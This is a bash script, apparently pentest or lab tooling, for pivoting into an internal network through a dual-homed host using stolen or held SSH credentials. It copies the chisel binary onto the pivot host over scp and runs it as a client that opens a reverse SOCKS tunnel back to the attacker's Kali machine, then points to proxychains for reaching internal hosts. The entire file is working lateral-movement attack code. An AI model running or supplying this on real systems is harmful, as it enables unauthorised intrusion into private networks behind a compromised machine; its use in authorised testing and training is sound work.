#!/bin/bash
#
# Use when you have SSH creds to a dual honed host and want to pivot through it to the internal network. No root required
# This script will create a remote driectory, send the chisel binary using SCP, send the reverse tunnel using chisel

kali_listen_port=8000		#Port to listen for chisel connection on
kali_socks_port=1080		#Port to open the socks proxy on (make sure socks5 proxy is defined in /etc/proxychains4.conf file) 
proxy_ip="10.10.10.10"        	#Machine you have SSH access to and want to use as a pivot
remote_dir="/path/to/create/"   #Directory to create on pivot machine
chisel_binary="/path/to/chisel" #Local path to chisel binary

ssh_user="user"
ssh_pass="password"
ssh_key="/path/to/key/file"

chisel_user="secure"
chisel_pass="securepass"

tun0="$(ifconfig | grep tun0 -a1 | grep inet | cut -d " " -f 10)"
kali_ip=$tun0

RED='\033[0;31m'
NC='\033[0m'

echo Start the chisel listener before you continue: $chisel_binary server --auth $chisel_user:$chisel_pass -p $kali_listen_port --reverse -v
read -p "Did you start the chisel server? [Y/n] " -n 1 -r
echo

if [[ ! $REPLY =~ ^[Yy]$ ]]
then
    exit 1
fi
read -p "What's the server's fingerprint? " fingerprint

PS3="Are you using SSH password or public key authentication? "
options=("Password" "Public Key" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Password")
            echo Using password authentication
	    echo Creating directory $remote_dir on $proxy_ip...
	    sshpass -p $ssh_pass ssh $ssh_user@$proxy_ip "mkdir -p $remote_dir"

	    echo Sending chisel binary to $proxy_ip at $remote_dir/chisel...
	    sshpass -p $ssh_pass scp $chisel_binary $ssh_user@$proxy_ip:$remote_dir/chisel

	    echo Sending reverse tunnel to port $kali_listen_port on kali...
	    echo Access the remote network using proxychains:
	    printf "${RED}proxychains -q curl http://172.16.1.17${NC}\n"
	    sshpass -p $ssh_pass ssh $ssh_user@$proxy_ip "$remote_dir/chisel client --auth $chisel_user:$chisel_pass --fingerprint $fingerprint $kali_ip:$kali_listen_port R:$kali_socks_port:socks"
	    break
	    ;;
	"Public Key")
	    echo Using public key authentication
	    echo Creating directory $remote_dir on $proxy_ip...
	    ssh -i $ssh_key $ssh_user@$proxy_ip "mkdir -p $remote_dir"

	    echo Sending chisel binary to $proxy_ip at $remote_dir/chisel...
	    scp -i $ssh_key $chisel_binary $ssh_user@$proxy_ip:$remote_dir/chisel

	    echo Sending reverse tunnel to port $kali_listen_port on kali...
	    echo Access the remote network using proxychains:
	    printf "${RED}proxychains -q curl http://172.16.1.17${NC}\n"
	    ssh -i $ssh_key $ssh_user@$proxy_ip "$remote_dir/chisel client --auth $chisel_user:$chisel_pass --fingerprint $fingerprint $kali_ip:$kali_listen_port R:$kali_socks_port:socks"
	    break
	    ;;
	"Quit")
	    break
	    ;;
	*) echo "Invalid option $REPLY";;
    esac
done
